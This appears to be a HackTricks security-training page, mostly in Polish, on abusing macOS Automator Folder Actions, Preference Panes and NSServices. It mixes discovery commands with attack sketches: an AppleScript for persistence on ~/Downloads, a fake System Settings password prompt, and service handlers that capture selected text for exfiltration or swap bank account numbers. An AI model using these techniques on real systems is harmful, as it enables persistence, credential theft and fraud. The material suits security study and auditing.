# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** to wizualne narzędzie automatyzacji macOS. Uruchamia **workflows** (`.workflow` bundles) złożone z **actions** (`.action` bundles). Automator obsługuje także integrację **Folder Actions**, **Quick Actions** oraz **Shortcuts**. We współczesnym macOS workflows mogą być również **imported into Shortcuts**, więc ta sama złośliwa logika może pojawić się jako Finder Quick Action, user service w `~/Library/Services/`, albo shortcut oparty na starszych akcjach Automator.

Automator actions to **plugins** ładowane do środowiska Automator, gdy workflow jest uruchamiany. Mogą:
- Execute arbitrary shell scripts
- Process files and data
- Interact with applications via AppleScript
- Chain together for complex automation

### Why This Matters

> [!WARNING]
> Automator workflows mogą zostać **social-engineered** do uruchomienia — wyglądają jak zwykłe pliki dokumentów. Bundle `.workflow` może zawierać osadzone shell commands, które wykonują się podczas uruchamiania workflow. W połączeniu z Folder Actions zapewniają **automatic persistence** uruchamiane na zdarzeniach plikowych. Ostatnie poprawki Gatekeeper pokazały też, że **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) muszą być traktowane jako wykonywalna zawartość, a nie nieszkodliwe dane.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Atak: Social-Engineered Workflow

Pakiet `.workflow` wygląda dla większości użytkowników jak zwykły plik dokumentu:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Atak: Folder Action Persistence

Folder Actions automatycznie wykonują workflow, gdy pliki są dodawane do monitorowanego folderu:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions utrzymują się po restartach i wykonują się bezgłośnie. Folder Action na `~/Downloads` oznacza, że **każdy pobrany plik uruchamia twój payload** — w tym pliki z Safari, Chrome, AirDrop i załączniki e-mail. Zwróć też uwagę, że `System Events` może rejestrować Folder Actions wskazujące na skrypty poza domyślnymi lokalizacjami `~/Library/Scripts/Folder Action Scripts`, co sprawia, że warto przeszukiwać luźne ścieżki. Dla powiązanych implikacji TCC sprawdź [the TCC page](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) to wtyczki ładowane z **System Settings** (dawniej System Preferences). Zapewniają panele UI do konfiguracji funkcji systemowych lub firm trzecich. Na starszych systemach były ładowane bezpośrednio przez `System Preferences`; w nowszych wersjach panele firm trzecich są zwykle obsługiwane przez **legacy loader XPC service** uruchamiany z System Settings.

### Why This Matters

- Preference panes wykonują się w **trusted host process** uruchamianym przez System Settings / System Preferences
- Na nowoczesnych systemach ten host może być **`legacyLoader` XPC service**, więc ważna granica to nadal **trusted Apple UI process -> ładowanie kodu firm trzecich**
- Preference panes firm trzecich dziedziczą **security context procesu hosta** i zaufanie użytkownika przypisane do tego UI
- Użytkownicy instalują preference panes przez **dwuklik** — łatwa socjotechnika
- Po instalacji **utrzymują się** i ładują za każdym razem, gdy System Settings otwiera ten panel

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Atak: Przejęcie kontekstu uprawnień

Złośliwy preference pane dziedziczy kontekst bezpieczeństwa **hosta panelu** (historycznie `System Preferences`, w nowszych wersjach często helper `legacyLoader` uruchamiany przez `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Atak: Utrzymywanie się przez instalację
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Atak: UI Phishing

Preference pane może naśladować legalne panele interfejsu systemu, aby **wyłudzać poświadczenia**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** allow applications to provide functionality to other apps through the **Services menu** (right-click → Services). When a user selects text or data and invokes a service, the selected data is **sent to the service provider** for processing.

Services are declared in an application's `Info.plist` under the `NSServices` key and registered with the pasteboard server (`pbs`). macOS also keeps a **service cache** and a **restriction policy** that decide which services are visible and whether sandboxed callers should receive an extra warning.

### Why This Matters

- Services receive **cross-application data flow** — selected text from any application is sent to the service
- A malicious service captures data from password managers, email clients, financial apps
- Services can **return modified data** to the calling application (man-in-the-middle on selection operations)
- Service names can be crafted to appear legitimate ("Format Text", "Encrypt Selection", "Share")
- The optional `NSRestricted` flag is security-relevant: a service marked unrestricted may be callable by a sandboxed app without the warning macOS shows for escape-prone services

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Atak: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Atak: Modyfikacja danych (Man-in-the-Middle)

Usługa może **modyfikować zwracane dane**, jednocześnie sprawiając wrażenie, że zapewnia legalną funkcję:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Ograniczone usługi i nowoczesne nadużycia

Apple obsługuje opcjonalny boolowski `NSRestricted` dla każdej definicji usługi. Jeśli jest ustawiony, macOS ostrzega sandboxed callerów, ponieważ usługa może pomóc im **uciec z sandbox lub granic prywatności**. Z ofensywnej perspektywy daje to dwie użyteczne ścieżki audytu:

- Szukaj **usług firm trzecich, które nie są oznaczone jako restricted**, mimo że pośredniczą w Apple Events, dostępie do plików lub innych uprzywilejowanych akcjach
- Szukaj **wbudowanych usług o wysokiej wartości** ze silnymi entitlementami (na przykład usługi udostępniane przez Script Editor lub helpery oparte o Finder) i sprawdzaj, czy sama interakcja użytkownika wystarcza, aby przekształcić je w primitive dostępu do danych

Dobrym niedawnym przykładem jest **CVE-2022-48574**, gdzie mechanizm Services można było nadużyć, aby dotrzeć do **plików użytkownika chronionych przez TCC bez oczekiwanego flow potwierdzenia**. Błąd został naprawiony, ale technika nadal jest użyteczna do threat modeling: każda usługa, która przekazuje dostęp do plików lub żądania automatyzacji w imieniu caller’a, zasługuje na taką samą analizę.

---

## Ostatnie uwagi bezpieczeństwa

- **Quick Actions są wykonywalnym contentem**: Apple naprawił w 2024 bypass Gatekeepera, w którym aplikacja z dołączonym Automator Quick Action mogła uruchomić się bez normalnej oceny. Podczas audytu aplikacji sprawdzaj `Contents/PlugIns/*.workflow/Contents/document.wflow` dokładnie tak samo, jak sprawdzałbyś helper scripts lub login items. Zobacz [stronę Gatekeepera](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts mogą dziedziczyć stare zachowanie Automatora**: Apple dodał również dodatkowy prompt zgody użytkownika po tym, jak odkryto, że aplikacje firm trzecich używały **legacy Automator action** do wysyłania Apple Events bez oczekiwanego flow uprawnień. Importowane workflows i bundles Shortcuts powinny być sprawdzane pod kątem `Run AppleScript`, `Run Shell Script` oraz podobnych bridge actions. Zobacz [stronę TCC](../macos-security-protections/macos-tcc/README.md).
- **Automator nadal jest aktywną granicą prywatności**: Apple wypuścił kolejny fix Automatora w 2025 roku dla dostępu do chronionych danych użytkownika. Nawet jeśli Automator jest legacy surface, traktuj każdy workflow runner, host Quick Action lub automation bridge jako aktualny attack surface, a nie martwy kod.

---

## Łańcuchy ataku między technikami

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Kradzież menedżera haseł
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referencje

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
